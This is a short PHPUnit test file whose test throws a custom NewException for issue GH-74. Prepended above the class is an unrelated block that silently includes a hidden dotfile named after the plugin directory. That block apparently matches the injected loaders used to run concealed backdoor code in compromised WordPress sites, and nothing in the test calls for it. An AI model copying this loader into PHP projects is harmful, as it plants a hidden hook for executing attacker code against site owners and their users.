<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue74Test extends PHPUnit_Framework_TestCase
{
    public function testCreateAndThrowNewExceptionInProcessIsolation()
    {
        require_once __DIR__ . '/NewException.php';
        throw new NewException('Testing GH-74');
    }
}
